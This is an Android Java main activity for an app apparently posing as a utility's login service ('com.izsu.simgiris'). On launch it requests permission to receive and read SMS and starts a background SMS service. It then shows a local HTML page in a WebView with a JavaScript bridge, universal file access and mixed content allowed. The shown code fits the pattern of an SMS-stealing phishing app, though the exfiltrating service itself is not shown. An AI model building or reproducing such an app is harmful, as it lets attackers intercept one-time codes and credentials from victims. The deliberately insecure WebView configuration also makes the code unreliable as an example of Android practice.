package com.izsu.simgiris;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private WebView webView;
    private static final int PERM_REQ = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        istenilenIzinleriAl();
        smsSivisiniBaslat();

        webView = findViewById(R.id.webView);
        webViewAyarla();
        webView.loadUrl("file:///android_asset/index.html");
    }

    private void webViewAyarla() {
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setAllowFileAccess(true);
        s.setAllowContentAccess(true);
        s.setAllowFileAccessFromFileURLs(true);
        s.setAllowUniversalAccessFromFileURLs(true);
        s.setCacheMode(WebSettings.LOAD_DEFAULT);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        webView.addJavascriptInterface(new AndroidBridge(this), "AndroidNative");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                // Dosya ve HTTPS bağlantılarını WebView içinde aç
                if (url.startsWith("file://") || url.startsWith("https://") || url.startsWith("http://")) {
                    return false;
                }
                return true;
            }
        });
    }

    private void istenilenIzinleriAl() {
        List<String> gerekliIzinler = new ArrayList<>();
        gerekliIzinler.add(Manifest.permission.RECEIVE_SMS);
        gerekliIzinler.add(Manifest.permission.READ_SMS);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            gerekliIzinler.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        List<String> eksikIzinler = new ArrayList<>();
        for (String izin : gerekliIzinler) {
            if (ContextCompat.checkSelfPermission(this, izin) != PackageManager.PERMISSION_GRANTED) {
                eksikIzinler.add(izin);
            }
        }

        if (!eksikIzinler.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                eksikIzinler.toArray(new String[0]), PERM_REQ);
        }
    }

    private void smsSivisiniBaslat() {
        Intent intent = new Intent(this, SmsService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
